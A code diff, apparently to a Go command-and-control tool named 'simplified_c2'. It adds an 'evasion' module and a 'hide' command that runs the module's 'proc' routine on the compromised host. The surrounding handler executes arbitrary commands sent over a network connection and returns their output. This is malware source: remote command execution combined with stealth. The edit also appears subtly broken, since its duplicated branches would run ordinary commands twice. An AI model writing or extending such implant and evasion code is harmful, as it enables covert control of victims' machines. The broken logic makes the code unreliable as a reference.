@@ -5,6 +5,7 @@ import (
 	"encoding/gob"
 	"errors"
 	"fmt"
+	"github.com/simplified_c2/modules/evasion"
 	"io"
 	"math/rand"
 	"net"
@@ -93,6 +94,10 @@ func NewConnector(config *ConnectorConfig) *Connector {
 	shellAnonModule := shell_anon.NewModule()
 	moduleSystem.Registry.RegisterModule("shell_anon", func() module.ModuleInterface {
 		return shellAnonModule
+	})
+	evasionModule := evasion.NewModule()
+	moduleSystem.Registry.RegisterModule("evasion", func() module.ModuleInterface {
+		return evasionModule
 	})
 	return &Connector{
 		config:       config,
@@ -306,6 +311,26 @@ func (c *Connector) handleConnection(conn net.Conn, sessionID string) {
 				continue
 			}
 			response = fmt.Sprintf("Anonymization applied: %v", result)
+		} else {
+			output, err := c.ExecuteCommand(command)
+			if err != nil {
+				response = fmt.Sprintf("Error: %v\n%s", err, output)
+			} else {
+				response = output
+			}
+		}
+		if command == "hide" {
+			evasionModule, err := c.moduleSystem.Manager.LoadModule("evasion")
+			if err != nil {
+				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("failed to load evasion: %v", err)), session)
+				continue
+			}
+			result, err := evasionModule.ExecuteCommand("proc", []string{})
+			if err != nil {
+				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("evasion: %v", err)), session)
+				continue
+			}
+			response = fmt.Sprintf("evasion applied: %v", result)
 		} else {
 			output, err := c.ExecuteCommand(command)
 			if err != nil {
